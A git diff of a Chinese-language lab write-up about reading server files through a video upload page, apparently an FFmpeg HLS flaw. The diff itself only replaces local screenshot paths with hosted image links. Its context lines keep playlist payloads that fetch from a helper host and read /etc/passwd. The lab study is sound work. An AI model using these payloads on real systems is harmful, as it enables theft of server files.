@@ -67,7 +67,7 @@ http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD6
 
 启动靶场后访问192.168.123.133:8080,一个上传页面
 
-![image-20220501162242565](D:\长亭\笔记\image-20220501162242565.png)
+![image-20220501162242565](https://user-images.githubusercontent.com/85486547/166141322-384de497-2e84-4e47-bcd0-5be44bb57ca9.png)
 
 
 
@@ -147,8 +147,9 @@ concat:http://192.168.123.128:8888/back.txt|file:///etc/passwd
 
 
 web端读取到数据
+![image-20220501171153607](https://user-images.githubusercontent.com/85486547/166141336-f06897f9-78b3-4cc1-913d-b03fe3fd7052.png)
 
-![image-20220501171153607](D:\长亭\笔记\image-20220501171153607.png)
+
 
 ### 步骤三
 
@@ -185,7 +186,8 @@ concat:http://192.168.123.128:8888/back.txt|subfile,,start,0,end,31,,:///etc/pas
 #EXT-X-ENDLIST
 ```
 
-![image-20220501174002759](D:\长亭\笔记\image-20220501174002759.png)
+![image-20220501174002759](https://user-images.githubusercontent.com/85486547/166141365-c03d4a11-7572-4d6f-956c-80bbccb8aa44.png)
+
 
 ## 修复
 
